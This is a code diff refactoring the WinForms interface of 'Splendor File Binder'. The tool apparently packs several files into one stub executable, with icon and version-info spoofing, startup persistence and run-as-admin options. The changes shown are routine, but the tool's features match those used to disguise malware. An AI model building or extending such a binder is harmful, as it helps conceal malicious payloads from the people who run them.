@@ -105,9 +105,11 @@ public partial class MainForm : Form
         };
         pnlHeader.Controls.Add(lblAppTitle);
 
+        string appVersion = System.Reflection.Assembly.GetExecutingAssembly().GetName().Version is { } v
+            ? $"v{v.Major}.{v.Minor}" : "v1.0";
         var lblBadge = new Label
         {
-            Text = "v1.0 • FLUENT EDITION",
+            Text = $"{appVersion} • FLUENT EDITION",
             Font = Theme.FontBadge,
             ForeColor = Theme.AccentCyan,
             Location = new Point(margin + 50, 36),
@@ -478,7 +480,7 @@ public partial class MainForm : Form
         int addedCount = 0;
         foreach (string file in files)
         {
-            if (File.Exists(file) && !filePaths.Contains(file))
+            if (File.Exists(file) && !filePaths.Any(p => string.Equals(p, file, StringComparison.OrdinalIgnoreCase)))
             {
                 filePaths.Add(file);
                 int rowIndex = dgvFiles.Rows.Add(Path.GetFileName(file), FormatSize(new FileInfo(file).Length), false, false);
@@ -651,14 +653,12 @@ public partial class MainForm : Form
         string? iconPath = assemblySettings.ChangeIcon ? assemblySettings.IconPath : null;
         var versionInfo = assemblySettings.ChangeAssemblyInfo ? assemblySettings.VersionInfo : null;
 
-        var startupFiles = new List<string>();
-        var adminFiles = new List<string>();
+        var startupFlags = new List<bool>();
+        var adminFlags = new List<bool>();
         for (int i = 0; i < dgvFiles.Rows.Count && i < filePaths.Count; i++)
         {
-            if (dgvFiles.Rows[i].Cells["Startup"].Value is true)
-                startupFiles.Add(Path.GetFileName(filePaths[i]));
-            if (dgvFiles.Rows[i].Cells["Admin"].Value is true)
-                adminFiles.Add(Path.GetFileName(filePaths[i]));
+            startupFlags.Add(dgvFiles.Rows[i].Cells["Startup"].Value is true);
+            adminFlags.Add(dgvFiles.Rows[i].Cells["Admin"].Value is true);
         }
 
         string extractLocation = cmbExtractLocation.SelectedIndex switch
@@ -679,7 +679,7 @@ public partial class MainForm : Form
             {
                 BinderEngine.Bind(stubPath, filePaths, outputPath,
                     iconPath: iconPath, versionInfo: versionInfo,
-                    startupFiles: startupFiles, adminFiles: adminFiles,
+                    startupFlags: startupFlags, adminFlags: adminFlags,
                     extractLocation: extractLocation,
                     progress: p => Invoke(() => progressBar.Value = (int)(p * 100)));
             });
@@ -693,8 +693,8 @@ public partial class MainForm : Form
                 $"Output: {outputPath}\n" +
                 $"Size: {FormatSize(sz)}\n" +
                 $"Embedded Files: {filePaths.Count}\n" +
-                (startupFiles.Count > 0 ? $"Startup: {startupFiles.Count}\n" : "") +
-                (adminFiles.Count > 0 ? $"Run as Admin: {adminFiles.Count}\n" : "") +
+                (startupFlags.Count(f => f) > 0 ? $"Startup: {startupFlags.Count(f => f)}\n" : "") +
+                (adminFlags.Count(f => f) > 0 ? $"Run as Admin: {adminFlags.Count(f => f)}\n" : "") +
                 $"Extract to: {cmbExtractLocation.SelectedItem}",
                 "Splendor File Binder", MessageBoxButtons.OK, MessageBoxIcon.Information);
         }
